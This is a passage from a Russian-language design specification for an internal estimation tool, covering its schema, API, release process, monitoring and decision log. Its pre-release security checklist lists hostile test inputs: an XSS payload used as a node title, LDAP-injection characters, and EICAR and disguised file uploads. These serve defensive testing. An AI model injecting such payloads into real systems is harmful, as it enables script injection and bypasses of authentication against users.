**ARCH-02.** Каждое изменение проекта увеличивает `projects.version` (монотонный счётчик) и записывается в `change_log` проекта с этим номером. Клиент знает последнюю применённую версию и при переподключении догружает пропущенное (FR-TREE-33). `change_log` хранится 7 дней; если клиент отстал сильнее — полная перезагрузка дерева.

**ARCH-03.** Суммы по узлам **не хранятся** в БД как источник истины: сервер считает их в памяти при выдаче дерева (дерево проекта ≤ 5 000 узлов загружается одним запросом), клиент пересчитывает локально. **Почему:** хранимые суммы требуют пересчёта всех предков при каждой правке и блокировок строк в БД при одновременных правках — ровно та проблема Cash-Meter, от которой уходим. Для списков проектов итоги кэшируются в таблице `project_totals` (часы E, P80, P90 и деньги без НДС; обновляется фоновой задачей с задержкой до 10 с). Денежные поля кэша отдаются только с правом `money.read` (FR-HOME-04).

**ARCH-05.** Отказоустойчивость ([Решение Q-47]): один сервер приложения и резервные копии; кластера и горячего резерва нет. Если Redis перезапустился и сессии потеряны, пользователи входят заново — это допустимо.

**ARCH-06.** Аутентификация реализована как набор провайдеров с общим интерфейсом (`local`, `ldap`), чтобы позже добавить Kerberos/SSO без переделки остального (FR-AUTH-AD-11).

**ARCH-04.** Порядок детей хранится строковым ключом (fractional indexing, `position TEXT COLLATE "C"`). Вставка между двумя узлами не требует перенумерации соседей и не создаёт конфликтов при одновременной вставке.

**project_rates** — `project_id`, `discipline_id NULL` (NULL = ставка УП), `rate_rub NUMERIC(12,0)`, уникальность (`project_id`, `discipline_id`) с `NULLS NOT DISTINCT` (PostgreSQL 15+), иначе две ставки УП с `discipline_id = NULL` не считались бы дублями.

**project_members** — `id`, `project_id`, `user_id`, `role ENUM('moderator','expert','presale')`, `discipline_id NULL` (обязательно для expert), `is_reviewer BOOLEAN`, уникальность (`project_id`, `user_id`, `role`, `discipline_id`) с `NULLS NOT DISTINCT`. `added_by_admin_self BOOLEAN` — назначение администратором себя или своей учётки (BR-ADM-03).

**project_phases** — `project_id`, `phase_id`, `is_enabled`, `in_pm_base BOOLEAN` (BR-CALC-05).

**project_disciplines** — `project_id`, `discipline_id`, PK из двух полей (дисциплины, добавленные в проект, FR-PRJ-04).

**nodes** — центральная таблица дерева

| Поле | Тип | Описание |
|---|---|---|
| id | UUID PK | |
| project_id | UUID FK, индекс | |
| parent_id | UUID FK NULL | NULL только у узлов-фаз |
| kind | ENUM('phase','discipline','item') | Фаза и дисциплина — системные узлы |
| phase_id | UUID FK | Денормализовано для всех узлов — быстрый фильтр и проверка прав |
| discipline_id | UUID FK NULL | Денормализовано для всех узлов ниже фазы |
| type_id | UUID FK NULL | Для `item` |
| title | VARCHAR(200) | |
| position | TEXT COLLATE "C" | Порядок среди соседей (ARCH-04) |
| o, r, p | NUMERIC(10,2) NULL, CHECK 0–99 999,5 | Только у листьев (BR-CALC-03) |
| multiplier | INT DEFAULT 1 CHECK ≥ 1 и ≤ 10 000 | |
| comment | VARCHAR(2000) NULL | |
| comment_tag_id | UUID NULL | |
| reviewed_by, reviewed_at | UUID, TIMESTAMPTZ NULL | «Проверено» |
| self_review | BOOLEAN DEFAULT false | Самопроверка (FR-REV-04) |
| version | INT | Версия узла (FR-TREE-32) |
| field_versions | JSONB | `{"o":7,"r":8,"p":5,"multiplier":1,"comment":3,...}` — версия узла, на которой поле менялось последний раз |

Ограничения: `CHECK (kind <> 'item' OR (phase_id IS NOT NULL AND discipline_id IS NOT NULL))`; признак «лист» не хранится, вычисляется (нет активных детей); глубина проверяется приложением (BR-TREE-05).

> **Проверка переполнения.** Худший случай листа: 10 000 × 99 999,5 ≈ 10⁹ ч; на 5 000 узлов — 5·10¹² ч. Поэтому суммы считаются в `Decimal` без ограничения разрядности, а в кэш `project_totals` пишутся `NUMERIC(14,2)` (до 10¹² ч); при большем значении запись в кэш не выполняется и в списке показывается «—». Деньги — `NUMERIC(15,0)` (до 10¹⁵ ₽).

**branch_status** — `project_id`, `phase_id`, `discipline_id`, `status ENUM('not_started','draft','done','not_needed')`, `changed_by`, `changed_at`. PK из трёх полей.

**node_history** (только INSERT) — `id`, `node_id`, `project_id`, `project_version`, `user_id`, `action ENUM('create','update','move','delete','restore','split','collapse','review')`, `changes JSONB` (`{"r":[12,16],"p":[20,30]}`), `created_at`.

**threads** (вопросы, FR-DISC-09) — `id`, `project_id`, `node_id NULL` (NULL — обсуждение уровня проекта), `opened_by`, `status ENUM('open','resolved')`, `resolved_by`, `resolved_at`, `is_customer BOOLEAN`, `customer_question_no INT NULL` (уникален в проекте), `customer_status ENUM('new','sent','answered','closed','withdrawn') NULL`, `sent_at`, `answered_at`, `edited_after_sent BOOLEAN`.

**messages** — `id`, `project_id`, `node_id NULL` (NULL — уровень проекта), `thread_id NULL` (сообщение-вопрос и ответы на него), `author_id`, `body VARCHAR(4000)` (для `customer_answer` — до 10 000), `kind ENUM('message','event','customer_answer')`, `needs_answer BOOLEAN`, `edited_at`, `revoked_at`.

**project_notes** (закрытые заметки, FR-NOTE-01; доступ только с правом `notes.read`) — `id`, `project_id`, `node_id NULL`, `author_id`, `body VARCHAR(4000)`, `created_at`, `edited_at`.

**customer_documents** (FR-DOC-01) — `id`, `project_id`, `file_name VARCHAR(255)`, `mime`, `size_bytes`, `storage_key UUID`, `key_enc BYTEA` (ключ файла под мастер-ключом), `scan_status ENUM('pending','clean','infected','error')`, `uploaded_by`, `uploaded_at`, `deleted_at`.

**support_sessions** (FR-ADM-06) — `id`, `admin_id`, `project_id`, `reason VARCHAR(500)`, `started_at`, `expires_at`.

**message_addressees** — `message_id`, `target_type ENUM('user','discipline','moderators','customer')`, `target_id NULL`.

**notifications** — `id`, `user_id`, `project_id`, `node_id`, `kind`, `payload JSONB` (без денег), `created_at`, `read_at`, `emailed_at`.

**snapshots** — `id`, `project_id`, `name VARCHAR(100)`, `description VARCHAR(1000)`, `created_by`, `created_at`, `is_invalid`, `payload JSONB` (дерево, расчёты, настройки, справочники), `money_payload JSONB` (ставки, курс, НДС, стоимость — отдаётся только с `money.read`), `payload_sha256`.

**change_log** — `project_id`, `version`, `event JSONB`, `created_at`; PK (`project_id`, `version`); очистка старше 7 дней.

**user_view_state** — `user_id`, `project_id`, `state JSONB` (раскрытие, фильтры, ширины).

**export_files** — `id`, `user_id`, `project_id`, `kind`, `path`, `expires_at`.

**audit_log** (схема `audit`, только INSERT) — поля по SEC-AUD-02. Партиционирование по месяцам.

### 14.3. Пример: загрузка дерева проекта

```sql
-- Одним запросом все живые узлы проекта; сборка дерева и суммы — в приложении
SELECT id, parent_id, kind, phase_id, discipline_id, type_id, title, position,
       o, r, p, multiplier, comment, comment_tag_id, reviewed_by, version
FROM nodes
WHERE project_id = :project_id AND deleted_at IS NULL
ORDER BY parent_id NULLS FIRST, position;
```

Индексы: `nodes(project_id) WHERE deleted_at IS NULL`, `nodes(parent_id, position)`, `messages(node_id, created_at)`, `threads(project_id) WHERE status = 'open'`, `threads(project_id, customer_question_no) UNIQUE WHERE is_customer`, `notifications(user_id) WHERE read_at IS NULL`, `node_history(node_id, created_at)`.

## 15. API и события реального времени

### 15.1. Соглашения

- Базовый путь `/api/v1`. JSON, UTF-8. Числа O/R/P и деньги передаются **строками** (`"12.5"`), чтобы не терять точность в JavaScript.
- Ошибки — формат RFC 9457 (Problem Details): `{"type": "...", "title": "...", "status": 409, "code": "FIELD_CONFLICT", "detail": "...", "error_id": "..."}`. Код `code` — стабильный, на него опирается фронтенд и тесты.
- Документация OpenAPI генерируется автоматически и доступна на тестовом стенде; на промышленном — выключена.
- Пагинация списков — курсорная (`?cursor=&limit=`, limit ≤ 200).

### 15.3. Пример: изменение листа

Запрос:

```http
PATCH /api/v1/nodes/0192f1c4-7a1e-7c3b-9f00-1a2b3c4d5e6f
Content-Type: application/json
X-CSRF-Token: 5f2c…

{
  "base_version": 7,
  "changes": { "r": "16", "p": "30" }
}
```

Ответ 200:

```json
{
  "node": {
    "id": "0192f1c4-…",
    "o": "8", "r": "16", "p": "30", "multiplier": 1,
    "e": "17.00", "sigma": "3.67",
    "version": 8
  },
  "project_version": 1051,
  "ancestors": [
    { "id": "…", "e": "92.67", "sigma": "10.39" }
  ],
  "totals": { "e": "406.51", "p80": "425.54", "p90": "435.50" },
  "branch_status": { "phase_id": "…", "discipline_id": "…", "status": "draft", "was": "done" }
}
```

Ответ 409 при конфликте поля:

```json
{
  "type": "https://estimator.local/problems/field-conflict",
  "title": "Значение уже изменено",
  "status": 409,
  "code": "FIELD_CONFLICT",
  "conflicts": [
    { "field": "r", "current": "18", "changed_by": "П. Петров", "changed_at": "2026-11-03T12:01:44Z" }
  ],
  "current_version": 9
}
```

Ошибки валидации — 422 с `code`: `VALUE_OUT_OF_RANGE`, `NODE_HAS_CHILDREN` (попытка поставить O/R/P узлу), `DEPTH_LIMIT`, `NODES_LIMIT`. Значение не кратное 0,5 не ошибка: сервер округляет его (BR-CALC-03) и возвращает фактическое значение. Ячейку редактирует другой пользователь — 423 `CELL_LOCKED` с полем `locked_by` (FR-TREE-31). Последний модератор — 409 `LAST_MODERATOR`; последний суперадминистратор — 409 `LAST_SUPERADMIN`. Денежных полей в ответе PATCH нет: деньги приходят событием `money.updated` по отдельному каналу.

### 15.4. События WebSocket

Подключение: `wss://<host>/api/v1/ws` с cookie сессии; затем клиент шлёт `{"op":"subscribe","project_id":"…","since":1050}`. Сервер проверяет членство и подписывает на `project:{id}` и, при праве, на `project:{id}:money` и `project:{id}:notes`.

| Событие (сервер → клиент) | Данные |
|---|---|
| `node.created`, `node.updated`, `node.moved`, `node.deleted`, `node.restored` | Узел (поля без денег), `project_version`, автор |
| `branch.status` | Фаза, дисциплина, статус, автор |
| `cell.locked`, `cell.unlocked` | node_id, поле, пользователь (имя, инициалы, цвет) |
| `message.created`, `message.updated`, `thread.resolved` | Сообщение, узел |
| `presence` | Кто сейчас в проекте (список пользователей) |
| `project.updated` | Изменённые настройки (без денег) |
| `money.updated` (только канал money) | Ставки, курс, итоги в деньгах |
| `note.created`, `note.updated` (только канал `project:{id}:notes`) | Закрытые заметки |
| `access.revoked` | Доступ к проекту отозван — клиент закрывает проект |
| `session.ended` | Сессия истекла или отозвана — сервер закрывает соединение (FR-SESS-02) |
| `resync.required` | Клиент слишком отстал — перезагрузить дерево |

| Команда (клиент → сервер) | Назначение |
|---|---|
| `subscribe`, `unsubscribe` | Подписка на проект |
| `lock` {node_id, field, force?}, `unlock`, `heartbeat` | Захват ячеек (FR-TREE-31), продление каждые 10 с; `force` — перехват модератором. Не продлевают сессию |

### 17.3. Чек-лист ручной проверки безопасности перед релизом

1. Вход: перебор пароля блокирует учётку после 5 попыток; логин суперадминистратора не блокируется, но задержка растёт; сообщение одинаковое для несуществующего логина.
2. Cookie сессии: `HttpOnly`, `Secure`, `SameSite=Strict`, префикс `__Host-`.
3. Выход завершает сессию на сервере (повтор старого cookie → 401).
4. Блокировка пользователя администратором выкидывает его из открытой вкладки ≤ 5 с (FR-SESS-05).
5. Заголовки безопасности (12.5) присутствуют на всех ответах, включая ошибки и статику.
6. XSS: название узла `<img src=x onerror=alert(1)>` выводится текстом везде: дерево, обсуждение, статистика, письмо, Excel, Word.
7. IDOR: подстановка UUID узла чужого проекта во все эндпоинты → 404.
8. Эксперт: поиск денег в Network-вкладке браузера, в WS-фреймах, в Excel.
9. Суперадминистратор не может открыть дерево проекта ни через интерфейс, ни через API.
10. В режиме AD: подмена сертификата контроллера (самоподписанный) → подключение отклоняется.
11. В логах приложения и Nginx нет паролей, токенов, cookie (поиск по тестовому паролю после прогона тестов).
12. Журнал аудита: попытка `UPDATE audit.audit_log` ролью приложения → ошибка прав; `audit verify` проходит; события доходят до SIEM.
13. Режим AD: пустой пароль и логин со спецсимволами LDAP (`*`, `(`, `)`, `\`) не дают входа и не меняют фильтр поиска.
14. CSP: в консоли браузера нет нарушений CSP на всех экранах; `style-src` без `'unsafe-inline'`, стили Mantine работают через nonce.
15. Документы заказчика: файл EICAR, переименованный `.exe` в `.pdf` и `.docm` отклоняются; скачивание идёт с `Content-Disposition: attachment`.
16. Приложение недоступно из интернета; админка суперадминистратора недоступна из сетей вне списка (404).
17. Выгрузки содержат гриф «Коммерческая тайна», ФИО и дату.

**Приёмка релиза** ([Решение Q-52]) подписывают владелец продукта и служба ИБ при выполнении всех условий: автотесты 17.1 зелёные; чек-лист 17.3 пройден службой ИБ, плюс сканирование OWASP ZAP без критичных и высоких находок; 0 открытых критичных дефектов; пилотная эксплуатация (UAT) на stage — 2 недели с реальными пользователями.

### 17.4. Тестовые данные

Скрипт `estimator seed-demo` (только для тестовых стендов, на промышленном отказывается запускаться): справочники по умолчанию, 12 пользователей всех ролей (включая руководителя пресейла и аудитора ИБ), проект «Портал дилеров» из раздела 5.1 со ставками из 6.5, проект на 2 000 узлов для нагрузочных тестов.

2. `docker compose pull`.
3. `estimator migrate` (миграции совместимы с предыдущей версией, NFR-MNT-02).
4. Поочерёдный перезапуск `api` — пользователи видят кратковременное переподключение WebSocket без потери данных.
5. Проверка `/health/ready` и журнала.

**Откат релиза.** Если после обновления найден критичный дефект: (1) вернуть предыдущий образ (`docker compose up` с прежним тегом) — миграции expand-совместимы с предыдущей версией (NFR-MNT-02), поэтому откат кода не требует отката БД; (2) если миграция всё же несовместима — `alembic downgrade` на предыдущую ревизию; (3) если данные повреждены — восстановление из резервной копии, сделанной на шаге 1. Решение об откате принимает владелец продукта, выполняет служба эксплуатации.

### 18.4. Мониторинг (минимум)

Метрики: число активных WS-соединений, задержка доставки событий, p95 времени ответа API по эндпоинтам, ошибки 5xx, неуспешные входы в минуту (всплеск — признак подбора), длина очереди Celery, время последней успешной синхронизации AD, время последнего бэкапа. Оповещения: 5xx > 1% за 5 минут, неуспешных входов > 50 за 5 минут, проверка AD (15 мин) не выполнялась > 1 часа, ежедневная синхронизация AD не выполнялась > 26 часов, бэкап старше 26 часов, отставание архивации WAL > 15 минут, сертификат УЦ контроллера AD или TLS-сертификат приложения истекает менее чем через 30 дней, очередь SIEM > 10 000 событий, проверка цепочки аудита не пройдена, ClamAV недоступен или его базы старше 3 дней.

**Ротация мастер-ключа и эскроу.** Ключ меняется раз в год и при подозрении на компрометацию командой `estimator rotate-key`; служба эксплуатации передаёт новую запечатанную копию в сейф ИБ в тот же день (SEC-CRYPT-07). Восстановление из бэкапа без ключа невозможно, поэтому раз в квартал при проверке восстановления (NFR-REL-03) используется копия ключа из сейфа.

## 20. Журнал решений

Краткая запись ключевых решений, чтобы через полгода было понятно, почему сделано именно так.

| № | Решение | Альтернатива, от которой отказались | Причина |
|---|---|---|---|
| D-01 | Дерево: Фаза → Дисциплина → свободная декомпозиция | Функциональное дерево «модуль → функция» общее для всех дисциплин | Отклонено заказчиком: каждая дисциплина режет работу по-своему (бэкенд по функциям, фронтенд по экранам) |
| D-02 | Фазы — справочник компании | Эксперты создают стадии, модератор маппит (концепция «Живая матрица») | Сопоставимость между проектами без ручного маппинга |
| D-03 | Один рабочий экран для всех ролей, отличие — только права и деньги | Разные экраны модератора и эксперта | Люди показывают экран друг другу и видят одно и то же |
| D-04 | Модератор правит листья напрямую, с историей и событием | Правка модератора как предложение, которое эксперт принимает/оспаривает | Решение заказчика: быстрее; прозрачность обеспечивает лента событий |
| D-05 | Мягкая блокировка ячейки, не строки | Блокировка строки (Cash-Meter) | Главная жалоба на Cash-Meter |
| D-06 | Суммы считаются на лету, не хранятся | Хранимые суммы в узлах | Нет каскадных блокировок в БД при параллельной работе |
| D-07 | σ листа × N (полная корреляция) | √N | Одна норма — одна ошибка для всех повторов |
| D-08 | УП — процент от работ, без листьев | УП как обычная фаза с листьями | Стандартная практика компании, 18% по умолчанию |
| D-09 | Ставки задаются в каждом проекте, нет общей сетки | Сетка ставок в админке | Решение заказчика: ставки зависят от проекта и заказчика; администратор денег не видит |
| D-10 | Курс валюты фиксируется в проекте вручную | Курс ЦБ автоматически | Воспроизводимость цифры КП |
| D-11 | Ctrl+Z нет, есть история значения | Отмена действий | Однозначность при совместной работе |
| D-12 | Суперадминистратор всегда входит локально с TOTP | Вход через AD | Break-glass при сбое AD; защита самой ценной учётки |
| D-13 | Серверные сессии в Redis, cookie HttpOnly | JWT | Мгновенный отзыв, защита от кражи токена через XSS |
| D-14 | Изменения — REST, события — WebSocket | Всё через WebSocket | Проверенные механизмы CSRF, rate limit, журналирования |
| D-15 | Суперадминистратор и администратор по должности не видят деньги; администратор может назначить себя в проект и тогда видит деньги как участник (принятый риск, с пометкой в аудите) | Админы видят всё; полный запрет на самоназначение | Разделение обязанностей, коммерческая тайна; администратор — доверенное лицо, запрет усложнил бы поддержку (Q-25) |
| D-16 | Нормы типа — подсказка, не автоподстановка | Автозаполнение O/R/P нормой | Эксперт думает над цифрой, нетиповое не маскируется под типовое |
| D-17 | «Цифра для КП» (E / P80 / P90) — настройка проекта, по умолчанию P80 | Фиксированный P80; показ обеих цифр без выбора | У разных заказчиков разная терпимость к риску (Q-01) |
| D-18 | Деньги округляются построчно до рубля по ROUND_HALF_UP, итог = сумма строк; цены без НДС, НДС отдельной строкой | Округление только итога; банковское округление; цены с НДС | Экспорт сходится до рубля, как в КП (Q-40, Q-41) |
| D-19 | Нет двойного контроля для критичных действий суперадминистратора; вместо него — оповещения по старому каналу и аудитор ИБ | Подтверждение вторым суперадминистратором | Мало суперадминистраторов, двойной контроль тормозил бы работу; обнаружение достаточно (Q-26, Q-27) |
| D-20 | Роль «Администратор» только вручную; группы AD дают лишь «Модератор» и «Пресейл» | Все роли из групп AD | Владелец группы AD не должен получать админку в обход журнала приложения (Q-17) |
| D-21 | Отзыв доступа из AD — проверка активных сессий каждые 15 минут | Только ночная синхронизация | Уволенный не должен работать до утра (Q-18) |
| D-22 | Переход AD → «Приложение» только консолью; сопоставление только по логину | Переход в обе стороны в интерфейсе; сопоставление по email | Обратный переход нужен лишь при аварии; email может привязать чужую учётку (Q-20) |
| D-23 | Суперадминистратор не блокируется по попыткам, вместо этого — растущая задержка и оповещение | Общая блокировка | Иначе любой может запереть break-glass учётку (Q-21) |
| D-24 | Новые роли «Руководитель пресейла» и «Аудитор ИБ» | Расширить права пресейла и суперадминистратора | Сводка по портфелю и независимый контроль журнала без лишних прав (Q-27, Q-31) |
| D-25 | Документы заказчика — в отдельной вкладке с антивирусом и шифрованием; в обсуждениях только ссылки | Без файлов; вложения в сообщениях | Удобство работы с ТЗ при контролируемом риске (Q-09) |
| D-26 | Один сервер, без HA; потеря сессий при сбое Redis допустима | Кластер PostgreSQL и Redis | Внутренний инструмент на 300 пользователей, RTO 4 часа достаточно (Q-47) |
